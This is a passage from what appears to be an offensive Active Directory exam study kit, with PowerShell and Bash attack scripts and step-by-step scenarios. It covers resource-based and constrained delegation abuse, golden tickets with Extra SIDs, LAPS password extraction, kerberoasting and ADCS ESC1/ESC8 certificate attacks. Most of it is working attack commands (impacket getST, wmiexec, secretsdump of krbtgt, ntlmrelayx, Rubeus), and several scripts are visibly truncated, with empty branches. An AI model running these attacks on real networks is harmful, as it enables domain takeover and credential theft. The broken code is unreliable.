    [switch]$Execute,
    [switch]$Help
)

$ErrorActionPreference = 'Continue'

$script:ToolDir = $ToolDir
$script:ImpersonateUser = $ImpersonateUser

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
function Initialize-M12dRoot {
    if ($Domain) {
        $parts = $Domain.Split('.') | Where-Object { $_ -ne '' }
        $dn = ($parts | ForEach-Object { "DC=$_" }) -join ','
        return "LDAP://$dn"
    }
    $rootDse = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
    $nc = $rootDse.Properties['defaultNamingContext']
    if (-not $nc -or $nc.Count -eq 0) {
    }
    return "LDAP://$($nc[0])"
}

function Get-M12dSid {
    param([Parameter(Mandatory = $true)][string]$SamAccountName)
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($script:Root)
    $s.Filter = "(sAMAccountName=$SamAccountName)"
    $s.PageSize = 10
    [void]$s.PropertiesToLoad.Add('objectSid')
    [void]$s.PropertiesToLoad.Add('distinguishedName')
    $r = $s.FindOne()
    $sid = New-Object System.Security.Principal.SecurityIdentifier($r.Properties['objectSid'][0], 0)
    return @($sid.Value, [string]$r.Properties['distinguishedName'][0])
}

function Get-M12dComputerDn {
    param([Parameter(Mandatory = $true)][string]$ComputerName)
    $name = $ComputerName
    if (-not $name.EndsWith('$')) { $name = "$name`$" }
    $info = Get-M12dSid $name
    return $info[1]
}

function Write-M12dHead { param([string]$T) Write-Output ""; Write-Output "===== $T =====" }

function Show-M12dIdentity {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    Write-Output ("  SID             : " + $id.User.Value)
    if ($id.User.Value -eq 'S-1-5-18') {
    } else {
    }
    $p = New-Object System.Security.Principal.WindowsPrincipal($id)
}

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
function Get-M12dRbcd {
    param([Parameter(Mandatory = $true)][string]$ComputerName)
    $dn = Get-M12dComputerDn $ComputerName
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
    $raw = $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Value
    Write-Output ("  DN : " + $dn)
    if (-not $raw) {
        return $dn
    }
    $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor -ArgumentList @($raw, 0)
    foreach ($ace in $sd.DiscretionaryAcl) {
        $who = $ace.SecurityIdentifier.Value
        try { $who = $ace.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value } catch { }
    }
    return $dn
}

function Set-M12dRbcd {
    param(
        [Parameter(Mandatory = $true)][string]$ComputerName,
        [Parameter(Mandatory = $true)][string]$FakeSam
    )
    $dn = Get-M12dComputerDn $ComputerName
    $pair = Get-M12dSid $FakeSam
    $sid = $pair[0]

    $sddl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
    Write-Output ("  SDDL : " + $sddl)
    $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor -ArgumentList $sddl
    $buf = New-Object 'byte[]' $sd.BinaryLength
    $sd.GetBinaryForm($buf, 0)

    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
    try {
        $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Clear()
        $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Add($buf)
        $de.CommitChanges()
    } catch {
        return
    }

    Write-Output ""
    Write-Output "  export KRB5CCNAME=$($FakeSam.TrimEnd('$')).ccache"
    Write-Output "  impacket-getST -spn 'cifs/TARGET.corp.local' -impersonate $script:ImpersonateUser \"
    Write-Output "  export KRB5CCNAME=$($script:ImpersonateUser).ccache"
    Write-Output "  impacket-wmiexec -k -no-pass DOMAIN/$script:ImpersonateUser@TARGET.corp.local"
}

function Clear-M12dRbcd {
    param([Parameter(Mandatory = $true)][string]$ComputerName)
    $dn = Get-M12dComputerDn $ComputerName
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
    try {
        $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Clear()
        $de.CommitChanges()
    } catch {
    }
}

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
function Get-M12dConstrained {
    param([Parameter(Mandatory = $true)][string]$Account)
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($script:Root)
    $s.Filter = "(sAMAccountName=$Account)"
    [void]$s.PropertiesToLoad.Add('msDS-AllowedToDelegateTo')
    [void]$s.PropertiesToLoad.Add('userAccountControl')
    [void]$s.PropertiesToLoad.Add('servicePrincipalName')
    [void]$s.PropertiesToLoad.Add('distinguishedName')
    $r = $s.FindOne()
    $uacRaw = 0
    if ($r.Properties.Contains('userAccountControl')) { $uacRaw = [Convert]::ToInt32($r.Properties['userAccountControl'][0]) }
    $trans = ($uacRaw -band 0x100000) -ne 0
    Write-Output ("  DN                        : " + $r.Properties['distinguishedName'][0])
    Write-Output ("  SPN                       : " + (@($r.Properties['servicePrincipalName']) -join ' | '))
    $targets = @($r.Properties['msDS-AllowedToDelegateTo'])
    foreach ($t in $targets) { Write-Output ("    - " + $t) }
}

function Show-M12dS4uCommands {
    param([string]$Account, [string]$TargetSpn)
    if (-not $TargetSpn) { $TargetSpn = 'cifs/TARGET.corp.local' }
    Write-Output ("    .\\Rubeus.exe s4u /user:$Account /password:PASS /impersonateuser:$script:ImpersonateUser \")
    Write-Output ("        /msdsspn:$TargetSpn /ptt")
    Write-Output "    .\\Rubeus.exe s4u /user:$Account /rc4:NTHASH /impersonateuser:$script:ImpersonateUser \"
    Write-Output ("        /msdsspn:$TargetSpn /ptt")
    Write-Output "  Linux（impacket）："
    Write-Output ("    impacket-getST -spn '$TargetSpn' -impersonate $script:ImpersonateUser \\")
    Write-Output ("        -dc-ip TARGET 'DOMAIN/$Account:PASS'")
    Write-Output ("    export KRB5CCNAME=$script:ImpersonateUser.ccache")
    Write-Output ("    impacket-wmiexec -k -no-pass DOMAIN/$script:ImpersonateUser@TARGET")
    Write-Output ""
    Write-Output ("    impacket-getST -spn '$TargetSpn' -impersonate $script:ImpersonateUser \\")
    Write-Output ("        -hashes :NTHASH -dc-ip TARGET 'DOMAIN/$Account:PASS'")
    Write-Output ""
    Write-Output "    curl --negotiate -u : http:

    if ($Execute -and (Test-Path (Join-Path $script:ToolDir 'Rubeus.exe'))) {
        Write-Output ""
        Write-Output ("    & (Join-Path '$script:ToolDir' 'Rubeus.exe') s4u /user:$Account /password:PASS /impersonateuser:$script:ImpersonateUser /msdsspn:$TargetSpn /ptt")
    }
}

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
function Get-M12dUnconstrained {
    $me = $env:COMPUTERNAME
    $host1 = if ($TargetComputer) { $TargetComputer } else { $me }

    try {
        $dn = Get-M12dComputerDn $host1
        $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
        $uac = 0
        if ($de.Properties['userAccountControl'].Value) {
            $uac = [Convert]::ToInt32($de.Properties['userAccountControl'].Value)
        }
        if (($uac -band 0x80000) -ne 0) {
        } else {
        }
    } catch {
    }

    Show-M12dIdentity

    $spoolPath = "\\$host1\pipe\spoolss"
    if (Test-Path $spoolPath) {
    } else {
    }

    foreach ($t in @('Rubeus.exe', 'SpoolSample.exe', 'printerbug.exe', 'PetitPotam.exe')) {
        $p = Join-Path $script:ToolDir $t
    }

    Write-Output ""
    Write-Output "         impacket-ticketConverter dc.txt dc.ccache"
    Write-Output "         export KRB5CCNAME=dc.ccache"
    Write-Output "         impacket-secretsdump -k -no-pass DC01.corp.local"

    if ($Execute) {
        $rubeus = Join-Path $script:ToolDir 'Rubeus.exe'
        if (Test-Path $rubeus) {
            Write-Output ""
            & $rubeus monitor /interval:5 /nowrap
        } else {
        }
    }
}

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
function Get-M12dEnumAll {
    $root = $script:Root
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
    $s.Filter = '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
    $s.PageSize = 200
    [void]$s.PropertiesToLoad.Add('sAMAccountName'); [void]$s.PropertiesToLoad.Add('dnsHostName')
    foreach ($r in $s.FindAll()) { Write-Output ("  " + $r.Properties['sAMAccountName'][0] + "  " + $r.Properties['dnsHostName'][0]) }

    $s2 = New-Object System.DirectoryServices.DirectorySearcher
    $s2.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
    $s2.Filter = '(msDS-AllowedToDelegateTo=*)'
    $s2.PageSize = 200
    [void]$s2.PropertiesToLoad.Add('sAMAccountName'); [void]$s2.PropertiesToLoad.Add('msDS-AllowedToDelegateTo')
    foreach ($r in $s2.FindAll()) {
        Write-Output ("  " + $r.Properties['sAMAccountName'][0] + " -> " + (@($r.Properties['msDS-AllowedToDelegateTo']) -join ', '))
    }

    $s3 = New-Object System.DirectoryServices.DirectorySearcher
    $s3.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
    $s3.Filter = '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)'
    $s3.PageSize = 200
    [void]$s3.PropertiesToLoad.Add('sAMAccountName'); [void]$s3.PropertiesToLoad.Add('distinguishedName')
    foreach ($r in $s3.FindAll()) {
        Write-Output ("  " + $r.Properties['sAMAccountName'][0])
        Write-Output ("      " + $r.Properties['distinguishedName'][0])
    }
}

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
function Show-M12dHelp {
    Write-Output @"


  -Mode Enum
  -Mode RBCD -TargetComputer TARGET -FakeAccount 'FAKE01$' [-ImpersonateUser Administrator]
  -Mode RBCD-Rollback -TargetComputer TARGET
  -Mode Constrained -ServiceAccount svc_sql [-Spn 'cifs/TARGET.corp.local']

"@
}

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
if ($Help) { Show-M12dHelp; return }

try { $script:Root = Initialize-M12dRoot }
catch {
    exit 1
}

switch ($Mode) {
    'Enum' {
        Get-M12dEnumAll
    }
    'RBCD' {
        if (-not $TargetComputer -or -not $FakeAccount) {
            Show-M12dHelp
            exit 1
        }
        Get-M12dRbcd $TargetComputer | Out-Null
        Set-M12dRbcd -ComputerName $TargetComputer -FakeSam $FakeAccount
    }
    'RBCD-Rollback' {
        if (-not $TargetComputer) {
            exit 1
        }
        Clear-M12dRbcd $TargetComputer
    }
    'Constrained' {
        if (-not $ServiceAccount) {
            exit 1
        }
        Get-M12dConstrained $ServiceAccount
        Show-M12dS4uCommands -Account $ServiceAccount -TargetSpn $Spn
    }
    'Unconstrained' {
        Get-M12dUnconstrained
    }
    'Help' { Show-M12dHelp }
}

Write-Output ""
````

## Scenario 51: Write access on a computer object (RBCD)

**Situation**: GenericWrite/GenericAll (or write `msDS-AllowedToActOnBehalfOfOtherIdentity`) on WS02, plus a fake machine account (default MAQ is 10).

**Assumptions**: `MachineAccountQuota` > 0; target account is not Protected Users / “account is sensitive”.

**Procedure**:
```bash
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Fake#Passw0rd' \
  -dc-ip DC01.corp.local 'CORP/USER:PASS'
# On Windows: m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'
impacket-getTGT -dc-ip DC01.corp.local 'CORP/FAKE01$:Fake#Passw0rd'
export KRB5CCNAME=FAKE01.ccache
impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
  -dc-ip DC01.corp.local 'CORP/FAKE01$:Fake#Passw0rd'
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass CORP/Administrator@WS02.corp.local
```

**Verify**: `klist` shows `cifs/WS02` for Administrator.

**If it fails**: MAQ=0 → use an existing account whose password/hash you already have (must have an SPN). Write fails → wrong DN or ACE. `getST` KDC error → sensitive account / missing SPN / expired ticket. Rollback the ACE when done.

**Exam notes / OPSEC**: The ACE is a persistent change. Rollback is mandatory.

---

## Scenario 52: Constrained delegation to listed SPNs only

**Situation**: You have `svc_sql` with `msDS-AllowedToDelegateTo` (e.g. `cifs/WS02`). You can impersonate users **only** to those SPNs.

**Assumptions**: Protocol transition (`TrustedToAuthForDelegation`) means S4U2Self needs no victim password. Without it you need the impersonated user’s TGT/hash.

**Procedure**:
```bash
impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
  -dc-ip DC01.corp.local 'CORP/svc_sql:PASS'
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass CORP/Administrator@WS02.corp.local
```
Windows: `Rubeus.exe s4u /user:svc_sql /password:PASS /impersonateuser:Administrator /msdsspn:cifs/WS02 /ptt`

**If it fails**: Don’t retarget a different service class than the ACE lists. Sensitive admin → pick another. Hash-only → `-hashes` / `-aesKey`.

**Exam notes / OPSEC**: Constrained tickets are host+SPN specific. Purge ccache after use.

---

## Scenario 53: Child-domain high privilege, forest root is the goal

**Situation**: You own the child (`child.corp.local`) including krbtgt or a DA who can dump it. The crown jewels are in `corp.local`. **Do not assume Extra SID works** until you read trust type, direction, and SID filtering.

**Procedure**:
```bash
nltest /domain_trusts /all_trusts
impacket-ticketer -nthash <child-krbtgt-NT> -domain child.corp.local \
  -domain-sid <child-SID> \
  -extra-sid 'S-1-5-21-<ROOT-SID>-519' Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass ROOTDC.corp.local
```

`WITHIN_FOREST (0x20)` + outbound/bidirectional → Extra SID is on the table. External/forest trusts, `QUARANTINED`, `TREAT_AS_EXTERNAL` → SID filtering on, Extra SID is a dead end. Root→child inbound-only → the child cannot authenticate to the root.

**If it fails**: No child krbtgt → DCSync the child DC first. TGS rejected → wrong root SID / missing `-519` / root DC FQDN not in `/etc/hosts`.

**Exam notes / OPSEC**: Golden tickets are the highest-sensitivity move. `ticketer` stays on Kali. Wipe ccache.

---

#### `m12-ad-enum-linux.sh` {#m12-ad-enum-linux-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
#            -u USER -p 'PASS'
#       ./m12-ad-enum-linux.sh -m laps  -s DC01.corp.local -D corp.local -u USER -p 'PASS'
#       ./m12-ad-enum-linux.sh -m trust -s DC01.corp.local -D corp.local -u USER -p 'PASS'
# =============================================================================
set -u

MODE="all"
DC=""
DOMAIN=""
NETBIOS=""
USER=""          # -u
PASS=""          # -p
NTHASH=""        # -H
BASEDN=""
OUTDIR="$HOME/osep/loot/m12"
DRY=0
PYBIN="$(command -v python3 || true)"

usage() {
    sed -n '2,30p' "$0" | sed 's/^# \{0,1\}//'
    cat <<'EOF'

                          msLAPS-Password* / msLAPS-EncryptedPassword）
              trust       trustedDomain：trustPartner/trustAttributes/trustDirection
              nmap        nmap -n -sV --script "ldap* and not brute"

EOF
    exit 0
}

err()  { printf '[!] %s\n' "$*" >&2; }
info() { printf '[*] %s\n' "$*"; }
head_() { printf '\n===== %s =====\n' "$*"; }

have() { command -v "$1" >/dev/null 2>&1; }

while getopts "m:s:D:N:u:p:H:b:o:nh" opt; do
    case "$opt" in
        m) MODE="$OPTARG" ;;
        s) DC="$OPTARG" ;;
        D) DOMAIN="$OPTARG" ;;
        N) NETBIOS="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        H) NTHASH="$OPTARG" ;;
        b) BASEDN="$OPTARG" ;;
        o) OUTDIR="$OPTARG" ;;
        n) DRY=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [ -z "$DC" ] || [ -z "$DOMAIN" ]; then
    usage
fi
if [ -n "$USER" ] && [ -z "$PASS" ] && [ -z "$NTHASH" ]; then
    usage
fi
case "$MODE" in
    all|base|users|computers|groups|spn|delegation|laps|trust|sid|nmap|netexec|bloodhound) ;;
esac

if [ -z "$BASEDN" ]; then
    _IFS="$IFS"; IFS='.'; read -r -a _segs <<< "$DOMAIN"; IFS="$_IFS"
    _acc=""
    for seg in "${_segs[@]}"; do
        [ -z "$seg" ] && continue
        if [ -z "$_acc" ]; then _acc="DC=$seg"; else _acc="$_acc,DC=$seg"; fi
    done
    BASEDN="$_acc"
fi
if [ -z "$NETBIOS" ]; then
    NETBIOS="$(printf '%s' "${DOMAIN%%.*}" | tr '[:lower:]' '[:upper:]')"
fi
BIND_DN="$NETBIOS\\$USER"
LDAP_URI="ldap://$DC"


printable() {
    local out="" a
    for a in "$@"; do
        case "$a" in
            *" "*|*"'"*|*'"'*) out="$out '$a'" ;;
            *)                 out="$out $a" ;;
        esac
    done
    printf '%s\n' "${out# }"
}

run_cmd() {
    local desc="$1"; shift
    head_ "$desc"
    printable "$@"
    if [ "$DRY" = "1" ]; then return 0; fi
    if ! have "$1"; then
        return 0
    fi
    return 0
}

ldap_search() {
    local filter="$1" attrs="$2"
    if [ -n "$USER" ]; then
        run_cmd "LDAP: $filter" ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no \
            -D "$BIND_DN" -w "$PASS" -b "$BASEDN" "$filter" $attrs
    else
        run_cmd "LDAP: $filter" ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no \
            -b "$BASEDN" "$filter" $attrs
    fi
}

mode_base() {
    ldap_search "(objectClass=*)" "namingContexts"
        nmap -n -sV --script "ldap* and not brute" -p 389 "$DC"
}

mode_users() {
    ldap_search "(&(objectClass=user)(objectCategory=person))" \
        "sAMAccountName userPrincipalName description pwdLastSet lastLogon memberOf adminCount"
    echo
    printf '  ldapsearch -x -H %s -D "%s" -w PASS -b "%s" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName\n' \
        "$LDAP_URI" "$BIND_DN" "$BASEDN"
}

mode_computers() {
    ldap_search "(objectClass=computer)" \
        "sAMAccountName dnsHostName operatingSystem operatingSystemVersion lastLogon pwdLastSet"
}

mode_groups() {
    ldap_search "(objectClass=group)" "sAMAccountName member memberOf adminCount"
    echo
    for rid in 512 519 518 544; do
            "$LDAP_URI" "$BIND_DN" "$BASEDN" "$rid"
    done
}

mode_spn() {
    ldap_search "(&(servicePrincipalName=*)(!(objectClass=computer)))" \
        "sAMAccountName servicePrincipalName memberOf adminCount pwdLastSet"
    echo
    printf '  impacket-GetUserSPNs -dc-ip %s -outputfile %s/spn.txt %s/%s:PASS\n' \
        "$DC" "$OUTDIR" "$NETBIOS" "$USER"
    printf '  hashcat -m 13100 %s/spn.txt /usr/share/wordlists/rockyou.txt\n' "$OUTDIR"
}

mode_delegation() {
    ldap_search "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
        "sAMAccountName dnsHostName"
    ldap_search "(msDS-AllowedToDelegateTo=*)" \
        "sAMAccountName msDS-AllowedToDelegateTo"
    ldap_search "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
        "sAMAccountName dnsHostName"
    echo
}

mode_laps() {
    ldap_search "(|(ms-Mcs-AdmPwd=*)(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-Password=*)(msLAPS-EncryptedPassword=*))" \
        "sAMAccountName dnsHostName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-PasswordExpirationTime msLAPS-EncryptedPassword"
    echo
}

print_trust_legend() {
    cat <<'EOF'

------------------------------------------------------------------------
EOF
}

mode_trust() {
    ldap_search "(objectClass=trustedDomain)" \
        "cn trustPartner trustAttributes trustDirection trustType flatName securityIdentifier"
    print_trust_legend
    echo
}

decode_sid_b64() {
    local b64="$1"
    if [ -n "$PYBIN" ]; then
        "$PYBIN" - "$b64" <<'PYEOF'
import base64, sys, struct
raw = base64.b64decode(sys.argv[1].strip())
rev, sub = raw[0], raw[1]
ident = struct.unpack('>Q', b'\x00\x00' + raw[2:8])[0]
out = ["S-%d-%d" % (rev, ident)]
for i in range(sub):
    off = 8 + i * 4
    out.append(str(struct.unpack('<I', raw[off:off + 4])[0]))
print('-'.join(out))
PYEOF
    else
    fi
}

mode_sid() {
    if [ -n "$USER" ] && have impacket-lookupsid; then
    else
        local b64
        if [ -n "$USER" ]; then
            b64="$(ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no -D "$BIND_DN" -w "$PASS" \
                   -b "$BASEDN" "(objectClass=domainDNS)" objectSid 2>/dev/null \
                   | awk '/^objectSid::/ {print $2; exit}')"
        else
            b64="$(ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no -b "$BASEDN" \
                   "(objectClass=domainDNS)" objectSid 2>/dev/null \
                   | awk '/^objectSid::/ {print $2; exit}')"
        fi
        printf 'ldapsearch ... "(objectClass=domainDNS)" objectSid\n'
        if [ -n "$b64" ]; then
        else
        fi
    fi
}

mode_nmap() {
}

mode_netexec() {
    if [ -n "$NTHASH" ]; then
        local creds="-u $USER -H $NTHASH"
    elif [ -n "$USER" ]; then
        local creds="-u $USER -p $PASS"
    else
        return 0
    fi
        -M enum_trusts -M laps
}

mode_bloodhound() {
    if [ -n "$NTHASH" ]; then
        local creds="-u $USER --hashes 00000000000000000000000000000000:$NTHASH"
    elif [ -n "$USER" ]; then
        local creds="-u $USER -p $PASS"
    else
        return 0
    fi
        bloodhound-python -c ALL $creds -d "$DOMAIN" -dc "$DC" -ns "$DC" --dns-tcp
}

case "$MODE" in
    all)
        mode_base; mode_users; mode_computers; mode_groups
        mode_spn; mode_delegation; mode_laps; mode_trust; mode_sid
        ;;
    base)       mode_base ;;
    users)      mode_users ;;
    computers)  mode_computers ;;
    groups)     mode_groups ;;
    spn)        mode_spn ;;
    delegation) mode_delegation ;;
    laps)       mode_laps ;;
    trust)      mode_trust ;;
    sid)        mode_sid ;;
    nmap)       mode_nmap ;;
    netexec)    mode_netexec ;;
    bloodhound) mode_bloodhound ;;
esac

````

#### `m12-laps-and-trust-notes.md` {#m12-laps-and-trust-notes-md}

````markdown

<!--
      m12-ad-enum-windows.ps1 -Mode LAPS。
-->

>

---


```bash
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(objectClass=computer)" \
  ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-EncryptedPassword

ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(ms-Mcs-AdmPwdExpirationTime=*)" dnshostname
```

|---|---|

---


```bash
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(&(objectClass=computer)(sAMAccountName=WS02$))" \
  dnshostname ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(ms-Mcs-AdmPwd=*)" dnshostname ms-Mcs-AdmPwd

netexec ldap TARGET -u USER -p 'PASS' -M laps
netexec ldap TARGET -u USER -H NTHASH -M laps
```


```powershell
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*))").FindAll() |
  ForEach-Object { $_.Properties.dnshostname; $_.Properties.'ms-mcs-admpwd' }

([adsisearcher]"(&(objectCategory=computer)(sAMAccountName=WS02$))").FindOne().Properties.'ms-mcs-admpwd'

([adsisearcher]"(&(objectCategory=computer)(ms-Mcs-AdmPwdExpirationTime=*))").FindAll().Count
```


```powershell
Import-Module .\PowerView.ps1
Get-DomainComputer -Identity WS02 -Properties ms-Mcs-AdmPwd
Get-DomainComputer | Select-Object dnshostname,'ms-mcs-admpwd' | Where-Object { $_.'ms-mcs-admpwd' }

Import-Module AdmPwd.PS
Get-AdmPwdPassword -ComputerName WS02
```


```powershell
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'
```

---


```bash
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(msLAPS-Password=*)" dnshostname msLAPS-Password msLAPS-PasswordExpirationTime
```

```powershell
Get-LapsADPassword -Identity WS02 -AsPlainText

Get-LapsADPassword -Identity WS02 -AsPlainText
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Services\AdmPwd
```


---


```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object { ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } |
  ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier) -PassThru } |
  Select-Object IdentityName, ObjectDN
```

```bash
netexec ldap TARGET -u USER -p 'PASS' -M laps
bloodhound-python -c ACL -u USER -p 'PASS' -d DOMAIN -dc TARGET -ns TARGET --dns-tcp
```


---


```bash
impacket-wmiexec DOMAIN/Administrator@TARGET -p 'PASS'
impacket-psexec  DOMAIN/Administrator@TARGET -p 'PASS'
evil-winrm -i TARGET -u Administrator -p 'PASS'
impacket-wmiexec DOMAIN/Administrator@TARGET -hashes :NTHASH
```


---


### Windows

```cmd
nltest /domain_trusts /all_trusts
nltest /trusted_domains
nltest /dclist:DOMAIN
```

```powershell
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, ForestTransitive
(Get-ADForest).Domains
([adsisearcher]"(objectClass=trustedDomain)").FindAll() |
  ForEach-Object { $_.Properties.cn; $_.Properties.trustpartner;
                  $_.Properties.trustattributes; $_.Properties.trustdirection }
```

### Linux

```bash
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(objectClass=trustedDomain)" \
  cn trustPartner trustAttributes trustDirection trustType flatName securityIdentifier

netexec ldap TARGET -u USER -p 'PASS' -M enum_trusts
./m12-ad-enum-linux.sh -m trust -s TARGET -D corp.local -u USER -p 'PASS'
```

---


|---|---|---|


---


```bash
impacket-secretsdump -just-dc-user krbtgt DOMAIN/USER:'PASS'@TARGET

impacket-lookupsid DOMAIN/USER:'PASS'@TARGET 2


export KRB5CCNAME=Administrator.ccache
klist -e
```


```cmd
mimikatz
```
```powershell
```


---


```bash
```
```cmd
mimikatz
```
```cmd
mimikatz
```


```bash
klist -e
```
```cmd
whoami /groups
```

---


|---|---|---|

---


````

## Scenario 54: Low-priv user can enroll a misconfigured template (ESC1)

**Situation**: Published template allows ENROLLEE_SUPPLIES_SUBJECT, client-auth EKU, low-priv enroll, no manager approval.

**Procedure**:
```bash
certipy find -u USER@corp.local -p 'PASS' -dc-ip DC01.corp.local -vulnerable -stdout
certipy req -u USER@corp.local -p 'PASS' -ca 'CORP-CA' -target CA01.corp.local \
  -template 'VulnTemplate' -upn administrator@corp.local -out admin
certipy auth -pfx admin.pfx -dc-ip DC01.corp.local -domain corp.local
impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC01.corp.local
```

**If it fails**: Missing SAN flag / EKU / enroll ACE / manager approval. Don’t keep tweaking ESC1 parameters.

---

## Scenario 55: CA HTTP enrollment (ESC8)

**Situation**: Web Enrollment is reachable; NTLM relay to `certsrv`.

**Procedure**:
```bash
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs
```
Trigger auth from a path the CA can see (printerbug, PetitPotam, or a user you already coerce). Then `certipy auth` the resulting cert.

**If it fails**: EPA / HTTPS-only / signing. Stay in scope.

---

#### `m12-adcs-esc1-esc8.sh` {#m12-adcs-esc1-esc8-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
#       ./m12-adcs-esc1-esc8.sh -m find -d corp.local -s DC01.corp.local -u USER -p 'PASS'
#       ./m12-adcs-esc1-esc8.sh -m req  -d corp.local -s DC01.corp.local -c CA01.corp.local \
#            -n 'CORP-CA' -t 'VulnTemplate' -U administrator@corp.local -u USER -p 'PASS' -o admin
#       ./m12-adcs-esc1-esc8.sh -m auth -P admin.pfx -d corp.local -s DC01.corp.local
#       ./m12-adcs-esc1-esc8.sh -m relay -c CA01.corp.local -t Machine -l LHOST -V DC01.corp.local \
#            -d corp.local -s DC01.corp.local -u USER -p 'PASS'
# =============================================================================
set -u

MODE="deps"
DOMAIN=""      # -d
DC=""          # -s  DC（TARGET）
CAHOST=""
CANAME=""
TEMPLATE=""
USER=""        # -u
PASS=""        # -p
NTHASH=""      # -H
UPN=""
PFX=""
OUT="admin"
LHOST=""
VICTIM=""
LOOT="$HOME/osep/loot/certs"
EXEC=0         # -x

usage() {
    sed -n '2,30p' "$0" | sed 's/^# \{0,1\}//'
    cat <<'EOF'


EOF
    exit 0
}

err()  { printf '[!] %s\n' "$*" >&2; }
info() { printf '[*] %s\n' "$*"; }
head_() { printf '\n===== %s =====\n' "$*"; }
have() { command -v "$1" >/dev/null 2>&1; }

printable() {
    local out="" a
    for a in "$@"; do
        case "$a" in
            *" "*|*"'"*|*'"'*) out="$out '$a'" ;;
            *)                 out="$out $a" ;;
        esac
    done
    printf '%s\n' "${out# }"
}

run() {
    printable "$@"
    if [ "$EXEC" != "1" ]; then return 0; fi
    if ! have "$1"; then
        return 0
    fi
    return 0
}

while getopts "m:d:s:c:n:t:u:p:H:U:P:o:l:V:xh" opt; do
    case "$opt" in
        m) MODE="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        s) DC="$OPTARG" ;;
        c) CAHOST="$OPTARG" ;;
        n) CANAME="$OPTARG" ;;
        t) TEMPLATE="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        H) NTHASH="$OPTARG" ;;
        U) UPN="$OPTARG" ;;
        P) PFX="$OPTARG" ;;
        o) OUT="$OPTARG" ;;
        l) LHOST="$OPTARG" ;;
        V) VICTIM="$OPTARG" ;;
        x) EXEC=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

CERTIPY=""
if have certipy; then CERTIPY="certipy"
